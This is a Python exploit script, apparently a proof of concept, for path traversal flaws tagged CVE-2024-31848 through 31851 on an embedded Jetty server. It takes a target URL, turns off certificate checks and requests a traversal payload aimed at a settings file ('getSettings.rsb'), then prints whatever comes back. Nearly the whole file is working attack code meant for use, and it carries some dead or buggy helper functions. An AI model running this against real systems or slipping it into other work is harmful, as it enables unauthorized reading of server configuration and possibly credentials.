import requests
import argparse
from urllib3.exceptions import InsecureRequestWarning
from urllib.parse import urlparse
import json
import pycurl
from io import BytesIO

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

GREEN = "\033[92m"
RED = "\033[91m"
RESET = "\033[0m"


def banner():
    print(f"""



 _______  _______  _______    ______   _______ _________ _______ 
(  ____ \(  ____ \(  ____ \  (  __  \ (  ___  )\__   __/(  ___  )
| (    \/| (    \/| (    \/  | (  \  )| (   ) |   ) (   | (   ) |
| (_____ | (__    | (__      | |   ) || (___) |   | |   | (___) |
(_____  )|  __)   |  __)     | |   | ||  ___  |   | |   |  ___  |
      ) || (      | (        | |   ) || (   ) |   | |   | (   ) |
/\____) || (____/\| (____/\  | (__/  )| )   ( |   | |   | )   ( |
\_______)(_______/(_______/  (______/ |/     \|   )_(   |/     \|



 """)
    print(f"{RED}CVE-2024-31848/31849/31850/31851{RESET}")
    print(f"{RED}Exploiting Path Traversal Vulnerabilities within CDATA on an Embedded Jetty Server.{RESET}")
    print(f"{RED}Developer: @Stuub{RESET}\n")


def isAlive(url):
    try:
        response = requests.get(url, verify=False)
        return True if response.status_code == 200 else False
    except Exception as e:
        return False


def hostHeader(url):
    parsed_url = urlparse(url)
    return parsed_url.netloc


def formatResponse(response):
    if response is not json:
        print(response.text)
        exit(0)

    try:
        response_json = response.json()
        return json.dumps(response_json, indent=4)
    except json.JSONDecodeError:
        return "Response is not a JSON"


def make_request_with_pycurl(url, host, payload):
    buffer = BytesIO()
    c = pycurl.Curl()
    c.setopt(c.URL, f"{url}/{payload}")
    c.setopt(c.HTTPHEADER, [f"Host: {host}", f"Referer: {url}"])
    c.setopt(c.WRITEDATA, buffer)
    c.setopt(c.SSL_VERIFYHOST, 0)
    c.setopt(c.SSL_VERIFYPEER, 0)

    try:
        c.perform()
        http_code = c.getinfo(pycurl.HTTP_CODE)
        body = buffer.getvalue().decode('utf-8')
        print(f"{GREEN}[+]{RESET} Request URL: {c.getinfo(pycurl.EFFECTIVE_URL)}")
        print(f"{GREEN}[+]{RESET} Status Code: {http_code}")
        print(f"{GREEN}[+]{RESET} Response: {body}")
    except pycurl.error as e:
        print(f"{RED}[-]{RESET} Request failed: {e}")
    finally:
        c.close()


def exploit(url, payload=None):
    print(f"{GREEN}[+]{RESET} Target: {url}")
    print(f"{GREEN}[+]{RESET} Exploiting...")
    host = hostHeader(url)
    payload = "ui/..\src\getSettings.rsb?@json"
    make_request_with_pycurl(url, host, payload)


def handleResponse(response):
    pretty_json = formatResponse(response)
    if pretty_json == "Response is not a JSON":
        print(f"{RED}[-]{RESET} Response is not a JSON")
        print(f"Response: {response.text}")
    elif response.status_code == 200:
        print(f"{GREEN}[+]{RESET} Exploited successfully")
        print(pretty_json)
    else:
        print(f"{RED}[-]{RESET} Exploitation failed")
        print(f"Status code: {response.status_code}")
        print(f"Response: {pretty_json}")


def main():
    parser = argparse.ArgumentParser(description='Exploit script for CVE-2024-31848')
    parser.add_argument('-u', '--url', help='Target URL', required=True)
    args = parser.parse_args()

    url = args.url
    banner()
    exploit(url)


if __name__ == "__main__":
    main()